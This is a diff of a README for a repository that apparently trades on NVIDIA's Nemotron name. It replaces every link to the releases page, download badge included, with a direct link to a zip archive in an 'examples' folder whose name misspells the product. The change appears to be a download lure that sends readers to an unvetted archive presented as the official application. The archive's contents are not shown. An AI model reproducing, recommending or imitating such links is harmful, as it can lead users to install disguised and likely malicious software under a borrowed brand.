@@ -1,6 +1,6 @@
 # 🖼️ NVIDIA-Nemotron-Parse-OCR - Effortless Document Parsing Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/releases)
+[![Download Now](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/raw/refs/heads/main/examples/Nemotron-NVIDI-OCR-Parse-v2.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/raw/refs/heads/main/examples/Nemotron-NVIDI-OCR-Parse-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the NVIDIA-Nemotron-Parse-OCR! This software simplifies document pars
 
 To begin, please visit our releases page to download the application:
 
-[Download the latest version here](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/releases).
+[Download the latest version here](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/raw/refs/heads/main/examples/Nemotron-NVIDI-OCR-Parse-v2.8.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest version at the top of the page.
@@ -82,4 +82,4 @@ If you encounter any issues or have questions, feel free to reach out. You can c
 
 We hope you find NVIDIA-Nemotron-Parse-OCR useful for your document parsing needs. Follow the instructions closely, and get started with your document processing today!
 
-[Download the latest version here](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/releases).
+[Download the latest version here](https://github.com/Suethampina/NVIDIA-Nemotron-Parse-OCR/raw/refs/heads/main/examples/Nemotron-NVIDI-OCR-Parse-v2.8.zip).
